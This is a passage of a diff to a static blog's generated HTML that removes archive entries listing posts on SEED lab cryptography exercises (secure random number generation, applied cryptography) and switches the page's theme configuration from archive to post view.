-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">CTF-PWN</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/post/2.html" class="archive-article-date">
-        <time datetime="2020-12-21T08:37:24.839Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-21</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/post/2.html">seedlab生成安全随机数</a>
-	
-    </h1>
   
 
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">seedlab</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">密码</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/post/1.html" class="archive-article-date">
-        <time datetime="2020-12-21T03:20:33.526Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-21</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/post/1.html">seedlab实验密码技术应用</a>
-	
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">seedlab</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">密码</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -492,8 +587,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
